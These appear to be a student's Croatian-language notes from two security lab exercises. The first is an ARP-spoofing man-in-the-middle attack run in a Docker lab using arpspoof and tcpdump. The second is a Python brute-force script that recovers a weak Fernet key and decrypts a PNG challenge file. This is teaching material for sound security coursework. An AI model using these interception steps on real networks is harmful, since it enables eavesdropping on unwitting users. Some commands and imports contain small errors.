# Laboratorijske vježbe (SRP)

## 1. laboratorijske vježbe

12.10.2021.

## Zadatak

Realizirati man in the middle napad iskorištavanjem ranjivosti ARP protokola.

Student će testirati napad u virtualiziranoj Docker mreži (Docker container networking) koju čine 3 virtualizirana Docker računala (eng. container): 

1. station-1 
2. station-2
3. evil-station (napadač)

## Pokretanje mreže na lokalnom računalu

**Kloniranje repozitorija**

<aside>
💡 $ git clone https://github.com/mcagalj/SRP-2021-22

</aside>

**Ulazak u novi direktorij**

<aside>
💡 $ cd SRP-2021-22/arp-spoofing/

</aside>

- u direktoriju su se nalazile već gotove skripte start.sh i stop.sh za pokretanje i zaustavljanje virtualiziranog mrežnog scenarija što možemo provjeriti naredbom code .

## Naredbe i alati u Linuxu

**Pokretanje i zaustavljanje virtualiziranog mrežnog scenarija**

<aside>
💡 $ ./start.sh

</aside>

<aside>
💡 $ ./stop.sh

</aside>

**Pokretanje shella**

<aside>
💡 $ docker ps exec -it sh

</aside>

**Provjera informacija (IP adrese i adrese mrežnog uređaja)**

<aside>
💡 $ ifconfig -a

</aside>

- uz pomoć dobivenih informacija pratimo jesmo li uspješno izvršili napad

**Provjera nalazi li se station-2 na istoj mreži**

<aside>
💡 $ ping station-2

</aside>

**Pokretanje shella u drugom kontejneru**

<aside>
💡 $ docker exec -it station-2 sh

</aside>

**Ostvarivanje komunikacije između station-1 i station-2** 

<aside>
💡 $ netcat -lp 9000

</aside>

- za ovakav način komunikacije treba znati IP adresu i port

<aside>
💡 $ netcat station-1 9000

</aside>

**Pokretanje shella u trećem kontejneru (napadača)**

<aside>
💡 $ docker exec -it evil-station sh

</aside>

## Napad na žrtvu

**Pokretanje napada**

<aside>
💡 $ arpspoof -t station-1 station-2

</aside>

<aside>
💡 $ tcpdump

</aside>

- sada pratimo razgovor između station-1 i station-2 bez njihova znanja

**Završetak napada**

<aside>
💡 $ echo 0 > /proc/sys/net/ipv4/ip_forward

</aside>

## 2. laboratorijske vježbe

26.10.2021.

## Zadatak

Dešifrirati odgovarajući *ciphertext* u kontekstu simetrične kriptografije. Izazov počiva na činjenici da student nema pristup enkripcijskom ključu.

Za pripremu *crypto* izazova, odnosno enkripciju korištena je Python biblioteka `[cryptography](https://cryptography.io/en/latest/)`. *Plaintext* koji student treba otkriti enkriptiran je korištenjem *high-level* sustava za simetričnu enkripciju iz navedene biblioteke - [Fernet](https://cryptography.io/en/latest/fernet/).

Fernet koristi sljedeće *low-level* kriptografske mehanizme:

- AES šifru sa 128 bitnim ključem
- CBC enkripcijski način rada
- HMAC sa 256 bitnim ključem za zaštitu integriteta poruka
- Timestamp za osiguravanje svježine (*freshness*) poruka

## Rad u Pythonu

**Stvaranje virtualnog okruženja**

<aside>
💡 $ pipenv shell

</aside>

**Instaliranje paketa cryptography i pokretanje pythona**

<aside>
💡 $ pip install cryptography

</aside>
<b>
<aside>
💡 $ python

</aside>

**Enkripcija i dekripcija**

```python
from cryptography.fernet import fernet

plaintext = b"Hello World"

key = Fernet.generate_key();
f = Fernet(key);

ciphertext = f.encrypt(plaintext);
f.decrypt(ciphertext);
```

-Prvo smo zadali neki tekst koji želimo enkriptirati. Zatim generiramo enkripcijski ključ koji nam je potreban za enkripciju plaintexta

-Nakon enkripcije koristimo ključ i za dekripciju ciphertexta

**Preuzimanje osobnog izazova na računalo**

```python
from cryptography.hazmat.primitives import hashes

def hash(input):
    if not isinstance(input, bytes):
        input = input.encode()

    digest = hashes.Hash(hashes.SHA256())
    digest.update(input)
    hash = digest.finalize()

    return hash.hex()

filename = hash('jukic_borna') + ".encrypted"
```

**Program za enkripciju**

```python
import base64
from cryptography.hazmat.primitives import hashes
from cryptography.fernet import Fernet

def hash(input):
    if not isinstance(input, bytes):
        input = input.encode()

    digest = hashes.Hash(hashes.SHA256())
    digest.update(input)
    hash = digest.finalize()

    return hash.hex()

def test_png(header):
    if header.startswith(b"\211PNG\r\n\032\n"):
        return True

def brute_force():
    filename = "3f7699d1bc4ee53a3e8f24bf77a150260f938f45b8d6a538819129263bd13.encrypted"
    with open(filename, "rb") as file:
        ciphertext = file.read()

    ctr = 0
    while True:
        key_bytes = ctr.to_bytes(32, "big")
        key = base64.urlsafe_b64encode(key_bytes)

        if not (ctr + 1) % 1000:
            print(f"[*] Keys tested: {ctr + 1:,}", end="\r")

        try:    
            plaintext = Fernet(key).decrypt(ciphertext)
            
            header = plaintext[:32]
            if test_png(header):
                print(f"[+] KEY FOUND: {key}")
                with open("BINGO.png", "wb") as file:
                    file.write(plaintext)         
                break

        except Exception:
            pass
            
        ctr += 1

if __name__ == "__main__":
    brute_force()
```

-Pokrećemo brute_force napad koji će se vrtiti sve dok se ne pronađe ključ, a u terminalu će nam ispisivati koliko je ključeva do sada provjerio iz skupa ključeva

-S obzirom da bi oduzimalo puno vremena, postavljeno je da to ispiše nakon svakog provjerenog tisućitog ključa

-Kada pronađe ključ, program se terminira te stvara datoteku u koju postavlja dekriptirani ciphertext tj. plaintext koja je u našem slučaju slika

NAPOMENA: pod filename je svatko dobio svoju datoteku iz servera koju je trebalo dekriptirati
